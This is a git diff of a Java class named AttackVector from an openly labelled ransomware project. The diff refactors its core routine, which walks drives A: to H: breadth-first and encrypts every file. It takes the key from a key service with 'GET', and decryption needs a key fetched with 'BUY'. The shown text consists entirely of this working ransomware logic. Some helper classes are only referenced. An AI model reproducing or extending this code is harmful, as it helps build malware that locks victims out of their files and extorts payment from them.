@@ -6,50 +6,56 @@ import java.util.Collections;
 import java.util.Map;
 
 import Agent.EncryptionAlgo.CryptoAlgorithm;
+import Agent.cryptFile.CryptoOperation;
+import Agent.cryptFile.DecryptFile;
+import Agent.cryptFile.EncryptFile;
 import Agent.entites.AlgorithmsMap;
 import Agent.entites.CryptoKey;
 import Agent.exceptions.RansomwareException;
 import Agent.services.KeyService;
 import Agent.traversal.*;
 
-public class AttackVector {
+public class AttackVector implements RansomVector {
 
 	private KeyService keyService;
-	
+
+	@Override
 	public void encryptFileSystem() throws RansomwareException {
 		try {
-			attack(keyService.getKey(), new EncryptFile());
+			cryptFileSystem(keyService.getKey("GET"), new EncryptFile());
 		} catch (RansomwareException e) {
-			throw new RansomwareException(e.getMessage(), e.getCause());
+			throw new RansomwareException("Encrypting the file-system failed", e.getCause());
 		}
 
 	}
 
+	@Override
 	public void decryptFileSystem() throws RansomwareException {
 		try {
-			attack(keyService.buykey(), new DecryptFile());
+			
+			cryptFileSystem(keyService.getKey("BUY"), new DecryptFile());
 		} catch (RansomwareException e) {
-			throw new RansomwareException(e.getMessage(), e.getCause());
+			throw new RansomwareException("Decrypting the file-system failed", e.getCause());
 		}
 
 	}
 
-	private void attack(CryptoKey key, Cryptable cryptFunc) throws RansomwareException {
-		Traverse<File> dfs = new DFS<File>();
+	private void cryptFileSystem(CryptoKey key, CryptoOperation cryptFunc) throws RansomwareException {
+		// Traverse<File> dfs = new DFS<File>();
 		// or
 		Traverse<File> bfs = new BFS<File>();
-
 		Collection<File> visitedFolders = Collections.emptySet();
 
 		for (char i = 'A'; i <= 'H'; i++) {
 			try {
 				traverseAndCrypt(i + ":\\", visitedFolders, key, bfs, cryptFunc);
 			} catch (RansomwareException e) {
-				throw new RansomwareException(e.getMessage(), e.getCause());
+				throw new RansomwareException("Traverse the whole file-system failed", e.getCause());
 			}
 
 		}
 	}
+
 	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
 		return algorithmMap.get(className);
 	}
@@ -61,9 +67,10 @@ public class AttackVector {
 	}
 
 	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
-			Cryptable cryptoFunc) throws RansomwareException {
+			CryptoOperation cryptoFunc) throws RansomwareException {
 
 		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
+		
 
 		struct.add(new File(inputDir));
 		while (!(struct.isEmpty())) {
@@ -82,8 +89,11 @@ public class AttackVector {
 						}
 
 					} else if (file.isFile()) {
-
-						cryptoFunc.doingCrypto(key, file, crypto);
+						try {
+							cryptoFunc.operate(key, file, crypto);
+						} catch (RansomwareException e) {
+							throw new RansomwareException(e.getMessage(), e.getCause());
+						}
 
 					}
 				}
